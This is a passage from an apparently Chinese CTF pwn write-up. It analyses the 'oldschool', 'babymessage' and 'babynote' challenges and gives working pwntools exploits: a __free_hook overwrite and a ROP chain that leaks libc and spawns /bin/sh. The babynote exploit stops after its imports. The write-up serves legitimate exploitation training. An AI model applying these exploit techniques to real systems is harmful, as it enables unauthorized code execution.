<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4</span> <span class="token operator">*</span> v2 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xEFFFFFFF</span> <span class="token punctuation">)</span></code></pre>
<p>源码中的if条件限制了我们往mmap出的区域的下方写数据，而优化之后if则变为了或条件，我们只需满足<code>4 * v2 &gt;= 0</code>便可以往mmap下方写数据</p>
<p>所以这题我们只需要先填满tcache，然后用show泄露出libc地址，然后利用mmap_edit往free_hook写system即可</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./oldschool'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'oldschool'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27.so'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">mmap_allocate</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Where do you want to start: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">mmap_edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'7'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Value: '</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># gdb.attach(io)</span>
libc_base <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1d87d8</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

mmap_allocate<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
offset <span class="token operator">=</span> <span class="token punctuation">(</span>free_hook<span class="token number">-0xe0000000</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">4</span>
mmap_edit<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> system<span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>exp里面解释一下这一句</p>
<pre class=" language-python"><code class="language-python">offset <span class="token operator">=</span> <span class="token punctuation">(</span>free_hook<span class="token number">-0xe0000000</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">4</span></code></pre>
<p>来源于IDA中的这一句</p>
<pre class=" language-c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_ptr <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v0<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span></code></pre>
<p>以及mmap的起始地址是<code>0xe0000000</code></p>
<h3 id="0x4-babymessage"><a href="#0x4-babymessage" class="headerlink" title="0x4.babymessage"></a>0x4.babymessage</h3><p>只开了NX保护，IDA分析</p>
<p>一共有三个功能，leave_name、leave_messgae和show</p>
<p>leave_name如下</p>
<pre class=" language-c"><code class="language-c">__int64 <span class="token function">leave_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  byte_6010D0<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> byte_6010D0<span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>往0x6010D0位置处写入四个字节</p>
<p>看到leave_message</p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">leave_message</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+14h] [rbp-Ch]</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"message: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strncpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  buf<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>注意到v3的位置在rbp-8处，可以往v3位置写入a1个字节，a1来源于v1</p>
<pre class=" language-c"><code class="language-c">v1 <span class="token operator">=</span> mm <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">256</span> <span class="token punctuation">)</span>
    v1 <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>
<span class="token function">leave_message</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>v1就是0x10，所以leave_message可以溢出到rbp，那么溢出到rbp有什么用，看到leave_message前面</p>
<pre class=" language-assembly"><code class="language-assembly">.text:0000000000400995 loc_400995:                             ; CODE XREF: work+72↑j
.text:0000000000400995                 mov     eax, [rbp+var_4]
.text:0000000000400998                 mov     edi, eax
.text:000000000040099A                 call    leave_message
.text:000000000040099F                 jmp     short loc_40093F</code></pre>
<p>leave_message函数会将rbp-4处的值作为参数，也就是read函数能够读入的字节数</p>
<p>而leave_name功能中会往0x6010d0处写入四个字节，于是我们溢出到rbp，将rbp覆盖成0x6010d0+4，这样leave_message函数便会将name作为read函数能够读入的字节数，只要我们写入的name的值大于256，read就能够读入0x100个字节，之后就是正常的ret2libc了</p>
<p>exp如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babymessage'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babymessage'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27.so'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">leave_name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">leave_message</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'message:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>message<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>


pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400ac3</span>
ret <span class="token operator">=</span> <span class="token number">0x0000000000400646</span>

leave_name<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6010d0</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span>
leave_message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">16</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
leave_message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
bin_sh_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'bin_sh_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

leave_name<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6010d0</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span>
leave_message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">16</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># gdb.attach(io)</span>
leave_message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>解释一下exp</p>
<pre class=" language-python"><code class="language-python">leave_name<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span></code></pre>
<p>这一句name被设置为0x61616161，大于256</p>
<pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6010d0</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span>
leave_message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre>
<p>溢出到rbp，将rbp设置为0x6010d0-0x10，这样后面再调用leave_message的话就能读入0x100个字节</p>
<pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">16</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
leave_message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre>
<p>直接溢出，泄露libc地址</p>
<p>之后的就是重复上面的操作，调用system(“/bin/sh”)</p>
<h3 id="0x5-babynote"><a href="#0x5-babynote" class="headerlink" title="0x5.babynote"></a>0x5.babynote</h3><p>只开启了NX保护</p>
<p>一共有6个功能</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. Add note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2. Show note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3. Delete note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"4. Edit note"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"5. Reset registration information"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"6. Check registration information"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"7. Exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>在程序一开始有一个regist函数</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">regist</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-50h]</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-38h]</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-28h]</span>

  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x50uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  qword_6020D0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  dest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x18uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x18uLL</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your motto: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your age: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strncpy</span><span class="token punctuation">(</span>qword_6020D0<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  qword_6020C8 <span class="token operator">=</span> v2<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>注意到其中的<code>strcpy(dest, &amp;s);</code>会将s中的值复制到dest中，而dest是一个0x18的chunk的指针，s是利用mmap开辟的一个0x50的区域的指针，我们可以往其中写入0x18个字节，看似无法利用strcpy进行溢出，然而<code>s</code>和<code>v2</code>是连续的，v2是一个长整型的变量，存储着年龄，所以当我们往s中输入0x18个字节就会和v2拼接在一起，strcpy就会造成溢出，可以通过age修改下一个chunk的size，构造出overlap。exp如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babynotes'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babynotes'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23.so'</span><span class="token punctuation">)</span>
